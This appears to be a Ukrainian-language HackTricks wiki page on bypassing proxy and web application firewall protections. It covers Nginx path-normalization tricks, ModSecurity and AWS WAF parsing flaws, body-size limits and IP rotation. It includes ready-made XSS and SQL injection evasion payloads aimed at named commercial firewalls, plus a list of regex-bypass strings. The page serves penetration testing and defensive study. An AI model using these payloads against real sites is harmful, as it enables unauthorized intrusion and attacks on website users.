# Обхід захистів Proxy / WAF

{{#include ../banners/hacktricks-training.md}}


## Обхід правил ACL Nginx за допомогою Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Техніки [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx rule example:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Щоб запобігти обходам, Nginx виконує нормалізацію шляху перед перевіркою. Однак якщо бекенд-сервер виконує іншу нормалізацію (видаляє символи, які nginx не видаляє), це може дозволити обійти цей захист.

### **NodeJS - Express**

| Версія Nginx | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Версія Nginx | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Версія Nginx | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Конфігурація Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx налаштовано блокувати доступ до `/admin.php`, але можливо обійти це, отримавши доступ до `/admin.php/index.php`.

### Як запобігти
```plaintext
location ~* ^/admin {
deny all;
}
```
## Обхід правил Mod Security <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Плутанина шляху

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) пояснюється, що ModSecurity v3 (до 3.0.12) **неправильно реалізовував змінну `REQUEST_FILENAME`**, яка мала містити доступний шлях (до початку параметрів). Це відбувалося тому, що він виконував URL-декодування, щоб отримати шлях.\
Тому запит типу `http://example.com/foo%3f';alert(1);foo=` в ModSecurity вважатиме, що шлях — лише `/foo`, оскільки `%3f` перетворюється на `?`, що завершує URL path, але фактичний шлях, який сервер отримає, — `/foo%3f';alert(1);foo=`.

Змінні `REQUEST_BASENAME` та `PATH_INFO` також були уражені цією помилкою.

Щось подібне сталося у версії 2 Mod Security, що дозволяло обійти захист, який забороняв доступ до файлів із певними розширеннями резервних копій (наприклад `.bak`) простим надсиланням крапки в URL закодованою як `%2e`, наприклад: `https://example.com/backup%2ebak`.

## Обхід AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Некоректний заголовок

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) зазначає, що можна було обійти правила AWS WAF, які застосовуються до HTTP заголовків, шляхом надсилання "malformed" заголовка, який AWS неправильно парсить, але який правильно обробляє backend-сервер.

Наприклад, надсилаючи наступний запит із SQL injection у заголовку X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Було можливо обійти AWS WAF, тому що він не розумів, що наступний рядок є частиною значення заголовка, тоді як NODEJS server це розумів (це було виправлено).

## Generic WAF bypasses

### Request Size Limits

Commonly WAFs have a certain length limit of requests to check and if a POST/PUT/PATCH request is over it, the WAF won't check the request.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Максимальний розмір тіла веб-запиту, який може бути проінспектований для захистів Application Load Balancer and AWS AppSync protections</td><td>8 KB</td></tr><tr><td>Максимальний розмір тіла веб-запиту, який може бути проінспектований для захистів CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access protections**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Older Web Application Firewalls with Core Rule Set 3.1 (or lower) allow messages larger than **128 KB** by turning off request body inspection, but these messages won't be checked for vulnerabilities. For newer versions (Core Rule Set 3.2 or newer), the same can be done by disabling the maximum request body limit. When a request exceeds the size limit:

Якщо p**revention mode**: Регіструє та блокує запит.\
If **detection mode**: Інспектує до ліміту, ігнорує решту, та реєструє, якщо `Content-Length` перевищує ліміт.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

By default, the WAF inspects only the first 8KB of a request. It can increase the limit up to 128KB by adding Advanced Metadata.

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Up to 128KB.

### Static assets inspection gaps (.js GETs)

Some CDN/WAF stacks apply weak or no content inspection to GET requests for static assets (for example paths ending with `.js`), while still applying global rules like rate limiting and IP reputation. Combined with auto-caching of static extensions, this can be abused to deliver or seed malicious variants that affect subsequent HTML responses.

Practical use cases:

- Send payloads in untrusted headers (e.g., `User-Agent`) on a GET to a `.js` path to avoid content inspection, then immediately request the main HTML to influence the cached variant.
- Use a fresh/clean IP; once an IP is flagged, routing changes can make the technique unreliable.
- In Burp Repeater, use "Send group in parallel" (single-packet style) to race the two requests (`.js` then HTML) through the same front-end path.

This pairs well with header-reflection cache poisoning. See:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuscation <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Сумісність Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Залежно від реалізації нормалізації Unicode (докладніше [тут](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), символи, що мають сумісність Unicode, можуть обійти WAF та виконатися як передбачений payload. Сумісні символи можна знайти [тут](https://www.compart.com/en/unicode).

#### Приклад <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Обхід контекстних WAFs за допомогою encodings <a href="#ip-rotation" id="ip-rotation"></a>

Як зазначено в [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), щоб обійти WAFs, які зберігають контекст user input, можна зловживати поведінкою WAF і змусити його нормалізувати user input.

Наприклад, у дописі згадується, що **Akamai URL decoded a user input 10 times**. Тому щось на кшталт `<input/%2525252525252525253e/onfocus` буде сприйняте Akamai як `<input/>/onfocus`, що **може здатися безпечним, бо тег закритий**. Однак, поки додаток не URL decode-ить input 10 разів, жертва побачить щось на кшталт `<input/%25252525252525253e/onfocus`, що **все ще валідно для XSS-атаки**.

Отже, це дозволяє **ховати payload-и в закодованих компонентах**, які WAF розкодує та інтерпретує, тоді як жертва цього не побачить.

Крім URL-encoding, це можна робити й іншими кодуваннями, такими як unicode, hex, octal тощо.

У дописі пропонуються такі фінальні bypass-и:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Також згадується, що залежно від **того, як WAFs розуміють контекст** user input, це можна зловживати. Приклад у блозі: Akamai дозволяв поміщати що завгодно між `/*` і `*/` (ймовірно, через те, що це часто використовується як коментар). Тому SQLinjection на кшталт `/*'or sleep(5)-- -*/` не буде виявлений і залишиться валідним, бо `/*` — це стартовий рядок інʼєкції, а `*/` — закоментовано.

Такі контекстні проблеми також можна використати для **зловживання іншими вразливостями, ніж та, яку очікує WAF** (наприклад, це можна використати для експлуатації XSS).

### Inline JavaScript first-statement inspection gaps

Деякі inline-інспекційні правила парсять лише перший JavaScript-statement всередині event handler. Додавши нешкідливий вираз у дужках, за яким іде крапка з комою (наприклад `onfocus="(history.length);payload"`), шкідливий код після крапки з комою оминає інспекцію, але браузер його виконає. Поєднання цього з focus, викликаним фрагментом (наприклад додавання `#forgot_btn`, щоб потрібний елемент був у фокусі при завантаженні), дозволяє click-less XSS, який одразу може викликати `$.getScript` і завантажити phishing-інструменти, такі як keyloggers. Див. [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs), що походить з [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Генерує API gateway URL для використання з ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Схоже на fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin, що використовує API gateway IPs
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Динамічно визначена кількість container instances активується залежно від розміру input-файлу і split factor; input розбивається на чанки для паралельного виконання — наприклад, 100 instances обробляють 100 chunks з 10,000-line input-файлу при split factor = 100 lines.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Різні техніки можна використати для обходу regex-фільтрів на firewalls. Приклади включають alternating case, додавання line breaks і encoding payload-ів. Ресурси по різноманітних bypass-ах доступні в [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) та [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Наведені нижче приклади взято з [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Інструменти

- [**nowafpls**](https://github.com/assetnote/nowafpls): Плагін для Burp, що додає додаткові дані в запити для обходу WAFs шляхом зміни довжини

## Посилання

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
